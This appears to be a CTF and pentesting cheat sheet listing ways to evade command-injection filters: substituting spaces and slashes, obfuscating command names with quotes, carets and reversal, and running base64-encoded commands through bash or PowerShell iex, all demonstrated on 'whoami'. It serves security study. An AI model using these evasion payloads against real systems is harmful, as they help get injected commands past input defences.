# Command Injection Bypass Filters

<div class="row row-cols-lg-2"><div>

#### Command Injection Bypass Filters — Character

[![bypass_bash_restrictions](../../../../../_badges/hacktricks/bypass_bash_restrictions.svg)](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
[![chillhack](../../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)

Bypass **space** character filtering.

* Try using tabs (`%09`)
* Try using variables (`${IFS}`)
* Try using brace expansion (`{ls,-la}`) -- bash
* ...

Bypass **braces/star** character filtering.

* You can replace `ls${IFS}/` with `ls$IFS""/`
* You can replace `ls${IFS}/` with `ls$IFS\/`
* You can replace `cat${IFS}*` with `cat$IFS$(ls)`

Bypass **slash** character filtering.

* Try using variables (`${PATH:0:1}`) -- may not be set
* Try using variables (`${HOME:0:1}`) -- may not be set
* Try using variables (`${PWD:0:1}`)
* ...

➡️ See also: `printenv`, `env`, `set`, `export` to list environment variables.

#### Command Injection Bypass Filters — Obfuscation

[![bypass_bash_restrictions](../../../../../_badges/hacktricks/bypass_bash_restrictions.svg)](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)

Remember that such payloads may contain filtered characters. See also tools such as [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator).

```ps
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$ $(a="WhOaMi";printf %s "${a,,}")
$ # using base64
$ base64 <<< whoami
d2hvYW1pCg==
$ bash<<<$(base64 -d<<<d2hvYW1pCg==) # whoami
$ # using UTF-16 and base64
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```
</div><div>

#### Command Injection Bypass Filters — Command Names

[![bypass_bash_restrictions](../../../../../_badges/hacktricks/bypass_bash_restrictions.svg)](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
[![chillhack](../../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
[![powershell_basic_jail](../../../../../_badges/rootme/app_script/powershell_basic_jail.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Basic-jail)

Add a pair of quotes/double quotes anywhere within the command

```ps
# Available on Linux, Windows (PowerShell)
$ w'ho'ami ; w""hoam''i
```

* Put `\\` or `$@` anywhere within the command

```ps
# Available on Linux
$ w\hoami ; who$@ami
```

* Put `^` anywhere within the command

```ps
# Available on Windows (CMD)
CMD> who^am^i
```

* Reverse commands

```ps
$ $(rev<<<'imaohw')
PS> iex "$('imaohw'[-1..-20] -join '')"
```

* Filters may have been applied only once

```ps
PS> cat # It doesn't work.
PS> ccatat # It works!
```

* Use variables to split the command

```ps
PS> $a="l"; $b="s" ; & $a$b
```
</div></div>